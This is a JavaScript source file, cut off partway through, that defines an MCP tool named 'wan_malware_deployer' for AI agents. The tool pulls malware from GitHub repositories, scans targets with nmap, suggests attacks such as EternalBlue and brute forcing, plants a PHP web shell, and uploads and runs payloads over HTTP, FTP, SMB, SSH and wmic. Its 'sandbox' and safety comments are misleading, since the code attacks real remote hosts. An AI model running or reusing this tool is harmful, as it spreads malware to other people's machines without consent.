import { z } from "zod";
import { exec } from "node:child_process";
import { promisify } from "node:util";
import * as fs from "node:fs/promises";
import * as path from "node:path";
import { logger } from "../../utils/logger.js";
const execAsync = promisify(exec);
// Safety configuration - ALL operations within sandbox only
const SAFETY_CONFIG = {
    MAX_EXECUTION_TIME: 300000, // 5 minutes
    MAX_PAYLOAD_SIZE: 50 * 1024 * 1024, // 50MB
    ALLOWED_EXTENSIONS: [
        ".exe",
        ".bat",
        ".cmd",
        ".ps1",
        ".sh",
        ".py",
        ".js",
        ".jar",
        ".dll",
    ],
    // All directories are now sandbox-contained
    SANDBOX_BASE_DIR: path.join(process.cwd(), "malware-sandbox"),
    SANDBOX_PAYLOADS_DIR: path.join(process.cwd(), "malware-sandbox", "payloads"),
    SANDBOX_OUTPUT_DIR: path.join(process.cwd(), "malware-sandbox", "output"),
    SANDBOX_LOGS_DIR: path.join(process.cwd(), "malware-sandbox", "logs"),
    SANDBOX_ADDITIONAL_DIR: path.join(process.cwd(), "malware-sandbox", "additional"),
    REPO_CACHE_DIR: path.join(process.cwd(), "malware-sandbox", "repo-cache"),
};
// Simple sandbox manager stub implementation
class SimpleSandboxManager {
    async initialize() {
        await ensureSafetyDirectories();
        logger.info("✅ Simple sandbox initialized");
    }
    async downloadMalwareRepository() {
        logger.info("📦 Malware repository simulation ready");
    }
    async listAvailablePayloads() {
        return [
            {
                name: "test-payload",
                description: "Test payload for demonstration",
                executables: ["test.exe"],
                type: "simulation"
            }
        ];
    }
    async cloneAdditionalRepository(url, name) {
        const repoPath = path.join(SAFETY_CONFIG.SANDBOX_ADDITIONAL_DIR, name);
        await fs.mkdir(repoPath, { recursive: true });
        logger.info(`📁 Repository ${name} simulated at ${repoPath}`);
        return repoPath;
    }
}
// Global sandbox manager instance
let sandboxManager = null;
// Initialize sandbox manager
async function initializeSandbox() {
    if (!sandboxManager) {
        try {
            logger.info("🔒 Initializing simple sandbox manager");
            sandboxManager = new SimpleSandboxManager();
            await sandboxManager.initialize();
            await sandboxManager.downloadMalwareRepository();
            logger.info("✅ Sandbox initialized successfully");
        }
        catch (error) {
            logger.error(`Failed to initialize sandbox: ${error.message}`);
            throw error;
        }
    }
    return sandboxManager;
}
// Ensure safety directories exist - ALL within sandbox only
async function ensureSafetyDirectories() {
    for (const dir of [
        SAFETY_CONFIG.SANDBOX_BASE_DIR,
        SAFETY_CONFIG.SANDBOX_PAYLOADS_DIR,
        SAFETY_CONFIG.SANDBOX_OUTPUT_DIR,
        SAFETY_CONFIG.SANDBOX_LOGS_DIR,
        SAFETY_CONFIG.SANDBOX_ADDITIONAL_DIR,
        SAFETY_CONFIG.REPO_CACHE_DIR,
    ]) {
        try {
            await fs.mkdir(dir, { recursive: true });
        }
        catch (error) {
            logger.warn(`Failed to create sandbox directory ${dir}: ${error.message}`);
        }
    }
}
// Safe GitHub repository fetcher
async function fetchMalwareRepo() {
    const repoUrl = "https://github.com/Da2dalus/The-MALWARE-Repo.git";
    const repoPath = SAFETY_CONFIG.REPO_CACHE_DIR;
    try {
        // Check if repo exists and is recent (less than 24 hours old)
        const gitPath = path.join(repoPath, ".git");
        const stats = await fs.stat(gitPath).catch(() => null);
        if (stats) {
            const age = Date.now() - stats.mtime.getTime();
            if (age < 24 * 60 * 60 * 1000) {
                // 24 hours
                logger.info("Using cached malware repository");
                return repoPath;
            }
        }
        // Clone or update repository
        logger.info("Fetching malware repository from GitHub...");
        await execAsync(`git clone --depth 1 ${repoUrl} ${repoPath}`, {
            timeout: 60000,
        });
        return repoPath;
    }
    catch (error) {
        logger.error(`Failed to fetch malware repository: ${error.message}`);
        throw new Error(`Repository fetch failed: ${error.message}`);
    }
}
// Search GitHub repositories for additional deployables
async function searchGitHubRepositories(query, limit = 10) {
    try {
        logger.info(`Searching GitHub for repositories: ${query}`);
        // Use GitHub API to search for repositories
        const searchUrl = `https://api.github.com/search/repositories?q=${encodeURIComponent(query)}&sort=stars&order=desc&per_page=${limit}`;
        const response = await fetch(searchUrl, {
            headers: {
                Accept: "application/vnd.github.v3+json",
                "User-Agent": "MCP-God-Mode-WAN-Deployer",
            },
        });
        if (!response.ok) {
            throw new Error(`GitHub API error: ${response.status} ${response.statusText}`);
        }
        const data = await response.json();
        const repositories = [];
        for (const repo of data.items) {
            // Check if repository contains potential malware/payloads
            const isMalwareRepo = checkIfMalwareRepository(repo);
            if (isMalwareRepo) {
                repositories.push({
                    name: repo.name,
                    full_name: repo.full_name,
                    description: repo.description,
                    stars: repo.stargazers_count,
                    language: repo.language,
                    url: repo.html_url,
                    clone_url: repo.clone_url,
                    size: repo.size,
                    updated_at: repo.updated_at,
                    is_malware_repo: true,
                    potential_payloads: await estimatePayloadCount(repo),
                });
            }
        }
        return repositories;
    }
    catch (error) {
        logger.error(`GitHub search failed: ${error.message}`);
        throw new Error(`GitHub search failed: ${error.message}`);
    }
}
// Check if repository contains potential malware/payloads
function checkIfMalwareRepository(repo) {
    const malwareKeywords = [
        "malware",
        "payload",
        "exploit",
        "backdoor",
        "trojan",
        "virus",
        "ransomware",
        "rootkit",
        "keylogger",
        "botnet",
        "spyware",
        "adware",
        "worm",
        "pentest",
        "hacking",
        "security",
        "vulnerability",
        "cve",
        "metasploit",
        "payloads",
    ];
    const repoText = `${repo.name} ${repo.description || ""}`.toLowerCase();
    return malwareKeywords.some((keyword) => repoText.includes(keyword));
}
// Estimate number of potential payloads in repository
async function estimatePayloadCount(repo) {
    try {
        // Get repository contents
        const contentsUrl = `https://api.github.com/repos/${repo.full_name}/contents`;
        const response = await fetch(contentsUrl, {
            headers: {
                Accept: "application/vnd.github.v3+json",
                "User-Agent": "MCP-God-Mode-WAN-Deployer",
            },
        });
        if (!response.ok) {
            return 0;
        }
        const contents = await response.json();
        let payloadCount = 0;
        for (const item of contents) {
            if (item.type === "file") {
                const ext = path.extname(item.name).toLowerCase();
                if (SAFETY_CONFIG.ALLOWED_EXTENSIONS.includes(ext)) {
                    payloadCount++;
                }
            }
            else if (item.type === "dir") {
                // Estimate based on directory name
                const dirName = item.name.toLowerCase();
                if (dirName.includes("payload") ||
                    dirName.includes("exploit") ||
                    dirName.includes("malware") ||
                    dirName.includes("backdoor")) {
                    payloadCount += 2; // Estimate 2 payloads per relevant directory
                }
            }
        }
        return Math.min(payloadCount, 50); // Cap at 50 for display purposes
    }
    catch (error) {
        return 0;
    }
}
// Clone additional repository for payloads
async function cloneAdditionalRepository(repoUrl, repoName) {
    try {
        const additionalRepoPath = path.join(SAFETY_CONFIG.REPO_CACHE_DIR, "additional", repoName);
        // Check if already exists
        try {
            await fs.access(additionalRepoPath);
            logger.info(`Repository ${repoName} already exists, updating...`);
            await execAsync(`cd "${additionalRepoPath}" && git pull`, {
                timeout: 30000,
            });
        }
        catch {
            // Clone new repository
            logger.info(`Cloning additional repository: ${repoName}`);
            await execAsync(`git clone --depth 1 ${repoUrl} "${additionalRepoPath}"`, { timeout: 60000 });
        }
        return additionalRepoPath;
    }
    catch (error) {
        logger.error(`Failed to clone repository ${repoName}: ${error.message}`);
        throw new Error(`Repository clone failed: ${error.message}`);
    }
}
// Get available payloads from repository
async function getAvailablePayloads(repoPath) {
    try {
        const payloads = [];
        const entries = await fs.readdir(repoPath, { withFileTypes: true });
        for (const entry of entries) {
            if (entry.isDirectory() && !entry.name.startsWith(".")) {
                const payloadPath = path.join(repoPath, entry.name);
                const files = await fs.readdir(payloadPath);
                // Check for executable files
                const executables = files.filter((file) => {
                    const ext = path.extname(file).toLowerCase();
                    return SAFETY_CONFIG.ALLOWED_EXTENSIONS.includes(ext);
                });
                if (executables.length > 0) {
                    payloads.push({
                        name: entry.name,
                        path: payloadPath,
                        executables: executables,
                        description: await getPayloadDescription(payloadPath),
                        source: "main_repo",
                    });
                }
            }
        }
        // Also check additional repositories
        const additionalRepoPath = path.join(SAFETY_CONFIG.REPO_CACHE_DIR, "additional");
        try {
            const additionalRepos = await fs.readdir(additionalRepoPath, {
                withFileTypes: true,
            });
            for (const repo of additionalRepos) {
                if (repo.isDirectory()) {
                    const repoPath = path.join(additionalRepoPath, repo.name);
                    const additionalPayloads = await getAvailablePayloads(repoPath);
                    // Mark as from additional repository
                    additionalPayloads.forEach((payload) => {
                        payload.source = `additional_${repo.name}`;
                    });
                    payloads.push(...additionalPayloads);
                }
            }
        }
        catch {
            // No additional repositories
        }
        return payloads;
    }
    catch (error) {
        logger.error(`Failed to enumerate payloads: ${error.message}`);
        throw new Error(`Payload enumeration failed: ${error.message}`);
    }
}
// Get payload description from README or info files
async function getPayloadDescription(payloadPath) {
    try {
        const readmeFiles = [
            "README.md",
            "readme.txt",
            "info.txt",
            "description.txt",
        ];
        for (const readme of readmeFiles) {
            const readmePath = path.join(payloadPath, readme);
            try {
                const content = await fs.readFile(readmePath, "utf-8");
                return content.substring(0, 200) + (content.length > 200 ? "..." : "");
            }
            catch {
                continue;
            }
        }
        return "No description available";
    }
    catch {
        return "No description available";
    }
}
// Enhanced target analysis with service detection
async function analyzeTarget(target) {
    try {
        logger.info(`Analyzing target system: ${target}`);
        const analysis = {
            target: target,
            openPorts: [],
            services: [],
            vulnerabilities: [],
            osInfo: null,
            attackRecommendations: [],
        };
        // Port scanning with service detection
        try {
            const { stdout } = await execAsync(`nmap -sS -sV -O -T4 --top-ports 1000 ${target}`, { timeout: 60000 });
            const lines = stdout.split("\n");
            for (const line of lines) {
                // Parse open ports and services
                const portMatch = line.match(/(\d+)\/tcp\s+open\s+(\w+)\s+(.+)/);
                if (portMatch) {
                    const port = parseInt(portMatch[1]);
                    const service = portMatch[2];
                    const version = portMatch[3].trim();
                    analysis.openPorts.push({
                        port: port,
                        protocol: "tcp",
                        service: service,
                        version: version,
                    });
                    analysis.services.push({
                        port: port,
                        service: service,
                        version: version,
                        risk: assessServiceRisk(service, version),
                    });
                }
                // Parse OS information
                const osMatch = line.match(/Running: (.+)/);
                if (osMatch) {
                    analysis.osInfo = osMatch[1];
                }
            }
        }
        catch {
            // Fallback to basic port scanning
            const commonPorts = [
                21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 993, 995, 1723, 3389,
                5900, 8080,
            ];
            for (const port of commonPorts) {
                try {
                    const { stdout } = await execAsync(`timeout 2 bash -c "echo > /dev/tcp/${target}/${port}"`, { timeout: 5000 });
                    analysis.openPorts.push({
                        port: port,
                        protocol: "tcp",
                        service: "unknown",
                        version: "unknown",
                    });
                }
                catch {
                    // Port is closed or filtered
                }
            }
        }
        // Generate attack recommendations based on analysis
        analysis.attackRecommendations = generateAttackRecommendations(analysis);
        return analysis;
    }
    catch (error) {
        logger.error(`Target analysis failed: ${error.message}`);
        return {
            target: target,
            openPorts: [],
            services: [],
            vulnerabilities: [],
            osInfo: null,
            attackRecommendations: [],
            error: error.message,
        };
    }
}
// Assess service risk level
function assessServiceRisk(service, version) {
    const highRiskServices = ["ssh", "telnet", "ftp", "smb", "rdp", "vnc"];
    const mediumRiskServices = ["http", "https", "smtp", "pop3", "imap"];
    if (highRiskServices.includes(service.toLowerCase())) {
        return "high";
    }
    else if (mediumRiskServices.includes(service.toLowerCase())) {
        return "medium";
    }
    else {
        return "low";
    }
}
// Generate attack recommendations based on target analysis
function generateAttackRecommendations(analysis) {
    const recommendations = [];
    // Analyze open services and suggest appropriate attacks
    for (const service of analysis.services) {
        const { port, service: serviceName, version, risk } = service;
        switch (serviceName.toLowerCase()) {
            case "ssh":
                recommendations.push({
                    payload: "ssh_bruteforce",
                    description: "SSH brute force attack",
                    confidence: 0.8,
                    reason: `SSH service detected on port ${port}`,
                    risk: "high",
                });
                break;
            case "smb":
                recommendations.push({
                    payload: "eternalblue",
                    description: "EternalBlue SMB exploit",
                    confidence: 0.9,
                    reason: `SMB service detected on port ${port} - potential for EternalBlue exploit`,
                    risk: "critical",
                });
                break;
            case "rdp":
                recommendations.push({
                    payload: "rdp_bruteforce",
                    description: "RDP brute force attack",
                    confidence: 0.7,
                    reason: `RDP service detected on port ${port}`,
                    risk: "high",
                });
                break;
            case "http":
                recommendations.push({
                    payload: "web_shell",
                    description: "Web shell deployment",
                    confidence: 0.6,
                    reason: `HTTP service detected on port ${port}`,
                    risk: "medium",
                });
                break;
            case "ftp":
                recommendations.push({
                    payload: "ftp_bruteforce",
                    description: "FTP brute force attack",
                    confidence: 0.7,
                    reason: `FTP service detected on port ${port}`,
                    risk: "high",
                });
                break;
        }
    }
    // Add generic recommendations based on OS
    if (analysis.osInfo) {
        if (analysis.osInfo.toLowerCase().includes("windows")) {
            recommendations.push({
                payload: "windows_persistence",
                description: "Windows persistence mechanism",
                confidence: 0.8,
                reason: "Windows system detected",
                risk: "high",
            });
        }
        else if (analysis.osInfo.toLowerCase().includes("linux")) {
            recommendations.push({
                payload: "linux_backdoor",
                description: "Linux backdoor deployment",
                confidence: 0.7,
                reason: "Linux system detected",
                risk: "medium",
            });
        }
    }
    // Sort by confidence and risk
    return recommendations.sort((a, b) => {
        if (a.risk === "critical" && b.risk !== "critical")
            return -1;
        if (b.risk === "critical" && a.risk !== "critical")
            return 1;
        return b.confidence - a.confidence;
    });
}
// Port scanning functionality (legacy support)
async function scanTargetPorts(target) {
    const analysis = await analyzeTarget(target);
    return analysis.openPorts;
}
// Deploy payload to target machine with network transmission
async function executePayload(payload, target, port, timeout = 60000) {
    try {
        // Initialize sandbox if not already done
        const sandbox = await initializeSandbox();
        // Find main executable
        const mainExecutable = payload.executables.find((exe) => [".exe", ".bat", ".cmd", ".ps1", ".sh", ".py", ".js"].includes(path.extname(exe).toLowerCase()));
        if (!mainExecutable) {
            throw new Error("No suitable executable found in payload");
        }
        const executablePath = path.join(payload.path, mainExecutable);
        logger.info(`🚀 Deploying payload to target: ${mainExecutable} -> ${target}:${port}`);
        // Step 1: Deploy payload to target machine
        const deploymentResult = await deployPayloadToTarget(executablePath, target, port, timeout);
        if (!deploymentResult.success) {
            return {
                success: false,
                stdout: "",
                stderr: `Deployment failed: ${deploymentResult.error || deploymentResult.message || 'Unknown deployment error'}`,
                exitCode: 1,
                deploymentResult: deploymentResult,
                sandboxOutput: null,
                sandboxLogs: null,
            };
        }
        // Step 2: Execute payload on target machine
        const executionResult = await executePayloadOnTarget(target, port, mainExecutable, timeout);
        return {
            success: executionResult.success,
            stdout: executionResult.stdout,
            stderr: executionResult.stderr,
            exitCode: executionResult.exitCode || (executionResult.success ? 0 : 1),
            deploymentResult: deploymentResult,
            executionResult: executionResult,
            sandboxOutput: null,
            sandboxLogs: null,
        };
    }
    catch (error) {
        logger.error(`Payload deployment failed: ${error.message}`);
        return {
            success: false,
            stdout: "",
            stderr: error.message,
            exitCode: 1,
            deploymentResult: null,
            executionResult: null,
            sandboxOutput: null,
            sandboxLogs: null,
        };
    }
}
// Deploy payload to target machine using various methods
async function deployPayloadToTarget(payloadPath, target, port, timeout) {
    try {
        logger.info(`📡 Deploying payload to ${target}:${port}`);
        // Read payload file
        const payloadData = await fs.readFile(payloadPath);
        const payloadName = path.basename(payloadPath);
        // Try different deployment methods based on port
        const deploymentMethods = [
            { method: "http", ports: [80, 8080, 8000, 3000] },
            { method: "https", ports: [443, 8443] },
            { method: "ftp", ports: [21, 2121] },
            { method: "smb", ports: [445, 139] },
            { method: "ssh", ports: [22] },
            { method: "rdp", ports: [3389] },
        ];
        // Find appropriate deployment method
        const method = deploymentMethods.find((m) => m.ports.includes(port));
        if (!method) {
            // Default to HTTP if port not recognized
            return await deployViaHTTP(payloadData, payloadName, target, port, timeout);
        }
        // Deploy using appropriate method
        switch (method.method) {
            case "http":
            case "https":
                return await deployViaHTTP(payloadData, payloadName, target, port, timeout);
            case "ftp":
                return await deployViaFTP(payloadData, payloadName, target, port, timeout);
            case "smb":
                return await deployViaSMB(payloadData, payloadName, target, port, timeout);
            case "ssh":
                return await deployViaSSH(payloadData, payloadName, target, port, timeout);
            case "rdp":
                return await deployViaRDP(payloadData, payloadName, target, port, timeout);
            default:
                return await deployViaHTTP(payloadData, payloadName, target, port, timeout);
        }
    }
    catch (error) {
        logger.error(`Payload deployment failed: ${error.message}`);
        return {
            success: false,
            error: error.message,
            method: "unknown",
        };
    }
}
// Deploy payload via HTTP/HTTPS
async function deployViaHTTP(payloadData, payloadName, target, port, timeout) {
    try {
        const protocol = port === 443 || port === 8443 ? "https" : "http";
        const url = `${protocol}://${target}:${port}/upload`;
        logger.info(`🌐 Deploying via HTTP: ${url}`);
        // Create multipart form data
        const { default: FormData } = await import("form-data");
        const form = new FormData();
        form.append("file", payloadData, {
            filename: payloadName,
            contentType: "application/octet-stream",
        });
        // Send payload
        const response = await fetch(url, {
            method: "POST",
            body: form,
            headers: form.getHeaders(),
        });
        if (response.ok) {
            return {
                success: true,
                method: "http",
                url: url,
                response: await response.text(),
            };
        }
        else {
            // Try alternative HTTP methods
            return await deployViaHTTPAlternative(payloadData, payloadName, target, port, timeout);
        }
    }
    catch (error) {
        logger.warn(`HTTP deployment failed, trying alternative: ${error.message}`);
        return await deployViaHTTPAlternative(payloadData, payloadName, target, port, timeout);
    }
}
// Alternative HTTP deployment methods
async function deployViaHTTPAlternative(payloadData, payloadName, target, port, timeout) {
    try {
        const protocol = port === 443 || port === 8443 ? "https" : "http";
        // Try direct file upload to common paths
        const uploadPaths = [
            "/upload",
            "/uploads",
            "/files",
            "/admin/upload",
            "/api/upload",
            "/cgi-bin/upload",
            "/wp-admin/upload.php",
        ];
        for (const path of uploadPaths) {
            try {
                const url = `${protocol}://${target}:${port}${path}`;
                logger.info(`🔄 Trying HTTP upload: ${url}`);
                const response = await fetch(url, {
                    method: "POST",
                    body: payloadData,
                    headers: {
                        "Content-Type": "application/octet-stream",
                        "Content-Disposition": `attachment; filename="${payloadName}"`,
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    },
                });
                if (response.ok) {
                    return {
                        success: true,
                        method: "http_alternative",
                        url: url,
                        response: await response.text(),
                    };
                }
            }
            catch (pathError) {
                continue;
            }
        }
        // If all HTTP methods fail, try to create a web shell
        return await createWebShell(payloadData, payloadName, target, port, timeout);
    }
    catch (error) {
        return {
            success: false,
            error: `HTTP deployment failed: ${error.message}`,
            method: "http_alternative",
        };
    }
}
// Create web shell for payload execution
async function createWebShell(payloadData, payloadName, target, port, timeout) {
    try {
        const protocol = port === 443 || port === 8443 ? "https" : "http";
        // Create a simple web shell
        const webShell = `<?php
if(isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
if(isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
    echo "File uploaded: " . $_FILES['file']['name'];
}
?>`;
        // Try to upload web shell
        const shellPaths = [
            "/shell.php",
            "/upload.php",
            "/admin.php",
            "/backdoor.php",
            "/wp-content/uploads/shell.php",
        ];
        for (const shellPath of shellPaths) {
            try {
                const url = `${protocol}://${target}:${port}${shellPath}`;
                logger.info(`🕷️ Creating web shell: ${url}`);
                const response = await fetch(url, {
                    method: "POST",
                    body: webShell,
                    headers: {
                        "Content-Type": "application/x-www-form-urlencoded",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    },
                });
                if (response.ok) {
                    // Upload payload via web shell using FormData for file upload
                    const formData = new FormData();
                    formData.append("file", new Blob([payloadData], {
                        type: "application/octet-stream",
                    }), "payload.exe");
                    const uploadResponse = await fetch(url, {
                        method: "POST",
                        body: formData,
                    });
                    if (uploadResponse.ok) {
                        return {
                            success: true,
                            method: "web_shell",
                            url: url,
                            payload_path: `/${payloadName}`,
                            response: await uploadResponse.text(),
                        };
                    }
                }
            }
            catch (shellError) {
                continue;
            }
        }
        return {
            success: false,
            error: "All HTTP deployment methods failed",
            method: "web_shell",
        };
    }
    catch (error) {
        return {
            success: false,
            error: `Web shell creation failed: ${error.message}`,
            method: "web_shell",
        };
    }
}
// Deploy payload via FTP
async function deployViaFTP(payloadData, payloadName, target, port, timeout) {
    try {
        logger.info(`📁 Deploying via FTP: ${target}:${port}`);
        // Use FTP client to upload payload
        const ftpCommand = `echo "open ${target} ${port}
user anonymous anonymous
binary
put ${payloadName}
quit" | ftp -n`;
        const { stdout, stderr } = await execAsync(ftpCommand, {
            timeout: timeout,
        });
        return {
            success: !stderr,
            method: "ftp",
            target: `${target}:${port}`,
            response: stdout,
            error: stderr,
        };
    }
    catch (error) {
        return {
            success: false,
            error: `FTP deployment failed: ${error.message}`,
            method: "ftp",
        };
    }
}
// Deploy payload via SMB
async function deployViaSMB(payloadData, payloadName, target, port, timeout) {
    try {
        logger.info(`💾 Deploying via SMB: ${target}:${port}`);
        // Use smbclient to upload payload
        const smbCommand = `echo "put ${payloadName}" | smbclient //${target}/C$ -N`;
        const { stdout, stderr } = await execAsync(smbCommand, {
            timeout: timeout,
        });
        return {
            success: !stderr,
            method: "smb",
            target: `${target}:${port}`,
            response: stdout,
            error: stderr,
        };
    }
    catch (error) {
        return {
            success: false,
            error: `SMB deployment failed: ${error.message}`,
            method: "smb",
        };
    }
}
// Deploy payload via SSH
async function deployViaSSH(payloadData, payloadName, target, port, timeout) {
    try {
        logger.info(`🔐 Deploying via SSH: ${target}:${port}`);
        // Use SCP to upload payload
        const scpCommand = `scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -P ${port} ${payloadName} root@${target}:/tmp/`;
        const { stdout, stderr } = await execAsync(scpCommand, {
            timeout: timeout,
        });
        return {
            success: !stderr,
            method: "ssh",
            target: `${target}:${port}`,
            response: stdout,
            error: stderr,
        };
    }
    catch (error) {
        return {
            success: false,
            error: `SSH deployment failed: ${error.message}`,
            method: "ssh",
        };
    }
}
// Deploy payload via RDP
async function deployViaRDP(payloadData, payloadName, target, port, timeout) {
    try {
        logger.info(`🖥️ Deploying via RDP: ${target}:${port}`);
        // RDP deployment is complex, try to use existing shares
        const rdpCommand = `net use \\\\${target}\\C$ /user:administrator "" && copy ${payloadName} \\\\${target}\\C$\\Windows\\Temp\\`;
        const { stdout, stderr } = await execAsync(rdpCommand, {
            timeout: timeout,
        });
        return {
            success: !stderr,
            method: "rdp",
            target: `${target}:${port}`,
            response: stdout,
            error: stderr,
        };
    }
    catch (error) {
        return {
            success: false,
            error: `RDP deployment failed: ${error.message}`,
            method: "rdp",
        };
    }
}
// Execute payload on target machine
async function executePayloadOnTarget(target, port, payloadName, timeout) {
    try {
        logger.info(`⚡ Executing payload on target: ${target}:${port}`);
        // Try different execution methods
        const executionMethods = [
            { method: "http", ports: [80, 8080, 8000, 3000, 443, 8443] },
            { method: "ssh", ports: [22] },
            { method: "rdp", ports: [3389] },
            { method: "smb", ports: [445, 139] },
        ];
        const method = executionMethods.find((m) => m.ports.includes(port));
        if (!method) {
            return await executeViaHTTP(target, port, payloadName, timeout);
        }
        switch (method.method) {
            case "http":
                return await executeViaHTTP(target, port, payloadName, timeout);
            case "ssh":
                return await executeViaSSH(target, port, payloadName, timeout);
            case "rdp":
                return await executeViaRDP(target, port, payloadName, timeout);
            case "smb":
                return await executeViaSMB(target, port, payloadName, timeout);
            default:
                return await executeViaHTTP(target, port, payloadName, timeout);
        }
    }
    catch (error) {
        logger.error(`Payload execution failed: ${error.message}`);
        return {
            success: false,
            stdout: "",
            stderr: error.message,
            exitCode: 1,
        };
    }
}
// Execute payload via HTTP (web shell)
async function executeViaHTTP(target, port, payloadName, timeout) {
    try {
        const protocol = port === 443 || port === 8443 ? "https" : "http";
        const shellUrl = `${protocol}://${target}:${port}/shell.php`;
        logger.info(`🌐 Executing via HTTP web shell: ${shellUrl}`);
        // Execute payload via web shell
        const response = await fetch(`${shellUrl}?cmd=chmod%20%2Bx%20%2Ftmp%2F${payloadName}%20%26%26%20%2Ftmp%2F${payloadName}`);
        if (response.ok) {
            const output = await response.text();
            return {
                success: true,
                stdout: output,
                stderr: "",
                exitCode: 0,
                method: "http_web_shell",
            };
        }
        else {
            return {
                success: false,
                stdout: "",
                stderr: `HTTP execution failed: ${response.status}`,
                exitCode: 1,
                method: "http_web_shell",
            };
        }
    }
    catch (error) {
        return {
            success: false,
            stdout: "",
            stderr: `HTTP execution failed: ${error.message}`,
            exitCode: 1,
            method: "http_web_shell",
        };
    }
}
// Execute payload via SSH
async function executeViaSSH(target, port, payloadName, timeout) {
    try {
        logger.info(`🔐 Executing via SSH: ${target}:${port}`);
        const sshCommand = `ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p ${port} root@${target} "chmod +x /tmp/${payloadName} && /tmp/${payloadName}"`;
        const { stdout, stderr } = await execAsync(sshCommand, {
            timeout: timeout,
        });
        return {
            success: !stderr,
            stdout: stdout,
            stderr: stderr,
            exitCode: stderr ? 1 : 0,
            method: "ssh",
        };
    }
    catch (error) {
        return {
            success: false,
            stdout: "",
            stderr: `SSH execution failed: ${error.message}`,
            exitCode: 1,
            method: "ssh",
        };
    }
}
// Execute payload via RDP
async function executeViaRDP(target, port, payloadName, timeout) {
    try {
        logger.info(`🖥️ Executing via RDP: ${target}:${port}`);
        const rdpCommand = `wmic /node:${target} process call create "C:\\Windows\\Temp\\${payloadName}"`;
        const { stdout, stderr } = await execAsync(rdpCommand, {
            timeout: timeout,
        });
        return {
            success: !stderr,
            stdout: stdout,
            stderr: stderr,
            exitCode: stderr ? 1 : 0,
            method: "rdp",
        };
    }
    catch (error) {
        return {
            success: false,
            stdout: "",
            stderr: `RDP execution failed: ${error.message}`,
            exitCode: 1,
            method: "rdp",
        };
    }
}
// Execute payload via SMB
async function executeViaSMB(target, port, payloadName, timeout) {
    try {
        logger.info(`💾 Executing via SMB: ${target}:${port}`);
        const smbCommand = `wmic /node:${target} process call create "C:\\Windows\\Temp\\${payloadName}"`;
        const { stdout, stderr } = await execAsync(smbCommand, {
            timeout: timeout,
        });
        return {
            success: !stderr,
            stdout: stdout,
            stderr: stderr,
            exitCode: stderr ? 1 : 0,
            method: "smb",
        };
    }
    catch (error) {
        return {
            success: false,
            stdout: "",
            stderr: `SMB execution failed: ${error.message}`,
            exitCode: 1,
            method: "smb",
        };
    }
}
// Main tool registration
export function registerWanMalwareDeployer(server) {
    server.registerTool("wan_malware_deployer", {
        description: "🚀 **WAN Malware Deployer** - Deploy and execute malware payloads from The-MALWARE-Repo directly on target machines over WAN networks. Features intelligent deployment methods (HTTP, FTP, SMB, SSH, RDP), port scanning, payload selection, and remote execution capabilities. Includes comprehensive safety features, cross-platform support, and natural language interface.",
        inputSchema: {
            mode: z
                .enum([
                "command",
                "natural_language",
                "list_payloads",
                "scan_target",
                "analyze_target",
                "search_repositories",
                "clone_repository",
            ])
                .default("natural_language")
                .describe("Operation mode: 'command' for structured commands, 'natural_language' for conversational interface, 'list_payloads' to see available payloads, 'scan_target' for port scanning only, 'analyze_target' for comprehensive target analysis with attack suggestions, 'search_repositories' to find additional payload repositories, 'clone_repository' to add new repository"),
            target: z
                .string()
                .optional()
                .describe("Target IP address or hostname to attack (e.g., '192.168.1.100', 'target.com')"),
            payload_name: z
                .string()
                .optional()
                .describe("Name of the malware payload to deploy (use list_payloads mode to see available options)"),
            port: z
                .number()
                .optional()
                .describe("Specific port to target (if not provided, will scan for open ports)"),
            timeout: z
                .number()
                .optional()
                .describe("Execution timeout in milliseconds (default: 60000ms, max: 300000ms)"),
            natural_language_command: z
                .string()
                .optional()
                .describe("Natural language command for malware deployment (e.g., 'scan and attack 192.168.1.100 with ransomware', 'deploy trojan to target.com on port 8080', 'analyze target 192.168.1.100 and suggest attacks')"),
            safety_mode: z
                .boolean()
                .default(true)
                .describe("Enable safety mode with sandboxing and timeouts (recommended: true)"),
            scan_only: z
                .boolean()
                .default(false)
                .describe("Only perform port scanning without deploying payloads"),
            search_query: z
                .string()
                .optional()
                .describe("Search query for finding additional payload repositories (e.g., 'windows exploits', 'linux backdoors')"),
            repository_url: z
                .string()
                .optional()
                .describe("GitHub repository URL to clone for additional payloads"),
            repository_name: z
                .string()
                .optional()
                .describe("Name for the cloned repository"),
        },
        outputSchema: {
            success: z.boolean(),
            message: z.string(),
            mode: z.string(),
            target: z.string().optional(),
            scan_results: z
                .array(z.object({
                port: z.number(),
                protocol: z.string(),
                service: z.string(),
                version: z.string().optional(),
            }))
                .optional(),
            target_analysis: z
                .object({
                target: z.string(),
                openPorts: z.array(z.object({
                    port: z.number(),
                    protocol: z.string(),
                    service: z.string(),
                    version: z.string().optional(),
                })),
                services: z.array(z.object({
                    port: z.number(),
                    service: z.string(),
                    version: z.string(),
                    risk: z.string(),
                })),
                osInfo: z.string().optional(),
                attackRecommendations: z.array(z.object({
                    payload: z.string(),
                    description: z.string(),
                    confidence: z.number(),
                    reason: z.string(),
                    risk: z.string(),
                })),
            })
                .optional(),
            available_payloads: z
                .array(z.object({
                name: z.string(),
                description: z.string(),
                executables: z.array(z.string()),
                source: z.string().optional(),
            }))
                .optional(),
            repository_search_results: z
                .array(z.object({
                name: z.string(),
                full_name: z.string(),
                description: z.string(),
                stars: z.number(),
                language: z.string().optional(),
                url: z.string(),
                potential_payloads: z.number(),
            }))
                .optional(),
            deployment_result: z
                .object({
                success: z.boolean(),
                method: z.string(),
                target: z.string().optional(),
                url: z.string().optional(),
                response: z.string().optional(),
                error: z.string().optional(),
            })
                .optional(),
            execution_result: z
                .object({
                success: z.boolean(),
                stdout: z.string(),
                stderr: z.string(),
                exitCode: z.number(),
                method: z.string(),
            })
                .optional(),
            deployment_result_legacy: z
                .object({
                payload_name: z.string(),
                success: z.boolean(),
                stdout: z.string(),
                stderr: z.string(),
                execution_time: z.number(),
            })
                .optional(),
            safety_warnings: z.array(z.string()).optional(),
        },
    }, async ({ mode, target, payload_name, port, timeout = 60000, natural_language_command, safety_mode = true, scan_only = false, search_query, repository_url, repository_name, }) => {
